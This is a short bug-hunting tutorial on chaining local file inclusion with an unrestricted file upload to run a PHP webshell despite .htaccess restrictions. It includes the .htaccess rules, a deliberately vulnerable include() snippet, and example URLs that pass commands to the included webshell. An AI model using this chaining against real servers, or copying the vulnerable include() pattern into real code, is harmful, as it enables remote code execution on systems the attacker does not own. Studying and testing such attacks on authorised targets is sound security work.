# Background

While bug Hunting, you might stumble upon an unrestricted file upload vulnerability. However, even when managing to upload a php webshell, its execution might be prevented via htaccess. 

In this page, i'll discuss pairing Local file inclusion (LFI) with unrestricted file upload to execute the php webshell in the simplest form (No LFI filter bypass or unrestricted file upload filter bypass).

# How does .htaccess prevent execution?
.htaccess files let Apache apply custom rules per directory.

**Disabling the php engine in the directory:**
```
php_flag engine off
```

**Returning a "403 forbidden" to certain files:**
```
<FilesMatch "(^#.*#|\.(exe|bak|config|php|dist|fla|inc|ini|log|psd|sh|sql|sw[op])|~)$">
    Order allow,deny
    Deny from all
    Satisfy All
</FilesMatch>
```

In both of these situations, the php webshell will not run.


# Using LFI to run the webshell

If an LFI vulnerability is found, it could be used to run the php webshell. However, note that depending on the php function that caused the LFI, this attack might be limited.


**LFI allowing execution (using "include()" or "require()"):**
```
<?php
if (isset($_GET['file'])) {
    include($_GET['file']);
}
?>

```
Note that include() does not process query strings. So in case the attack looked like the following:
```
http://192.168.7.10/lfi.php?file=uploads/webshell.php?cmd=pwd
```
The include() function would be ```include("uploads/webshell.php?cmd=pwd");``` and it won't find a file with that name.

The correct way to include paramters would be to use "&":
```
http://192.168.7.10/lfi.php?file=uploads/test.php&cmd=pwd
```






**Read Only LFI (using "file_get_contents"):**
```
<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    if (file_exists($file)) {
        $contents = file_get_contents($file);
        echo nl2br(htmlentities($contents));
    } else {
        echo "File does not exist.";
    }
} else {
    echo "No file specified.";
}
?>
```

file_get_contents Only reads files so it is not possible to use it in this case.